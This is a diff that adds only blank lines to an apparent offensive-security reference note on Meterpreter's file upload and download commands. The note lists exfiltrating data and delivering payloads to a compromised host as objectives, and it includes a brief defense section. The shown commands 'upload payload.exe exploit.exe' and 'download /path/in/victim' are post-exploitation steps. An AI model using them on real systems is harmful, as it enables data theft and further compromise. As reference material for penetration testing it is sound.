@@ -34,9 +34,13 @@ The Meterpreter File Transfer module allows an attacker to upload or download fi
 
 The Meterpreter File Transfer module allows an attacker to upload or download files to and from a compromised host using the Meterpreter session. This can be useful for exfiltrating sensitive data or for delivering additional payloads to the target system. The module supports both uploading and downloading files, as well as creating directories on the target system. The files can be compressed and encrypted to avoid detection by security controls.
 
+ 
+
 ## Requirements
 
 1. A Meterpreter session on the target system.
+
+ 
 
 ## Defense
 
@@ -46,11 +50,15 @@ The Meterpreter File Transfer module allows an attacker to upload or download fi
 
 1. Implement endpoint detection and response solutions to detect and respond to any malicious activity on the system.
 
+ 
+
 ## Objectives
 
 1. Exfiltrate sensitive data from the target system.
 
 1. Deliver additional payloads to the target system.
+
+ 
 
 # Instructions
 
@@ -60,10 +68,18 @@ The Meterpreter File Transfer module allows an attacker to upload or download fi
 
 - 'download /path/in/victim': This command downloads a file from the victim's machine to the attacker's machine. Replace '/path/in/victim' with the path of the file you want to download.
 
+ 
+
+
+
 **Code**: [[upload /path/in/hdd/payload.exe exploit.exe
 downlo]]
 
+
+
 > The 'upload' command takes two arguments: the path of the file on the attacker's machine and the name to save the file as on the victim's machine. The 'download' command takes one argument: the path of the file on the victim's machine that you want to download. Make sure to replace the paths and file names with the correct ones for your specific use case.
+
+
 
 **Command** ([[Upload payload.exe as exploit.exe]]):
 
@@ -71,11 +87,17 @@ downlo]]
 upload /path/in/hdd/payload.exe exploit.exe
 ```
 
+
+
+
+
 **Command** ([[Download from victim]]):
 
 ```bash
 download /path/in/victim
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -100,3 +122,5 @@ download /path/in/victim
 - [[Metasploit]]
 - [[Meterpreter - Basic]]
 - [[Upload / Download]]
+
+
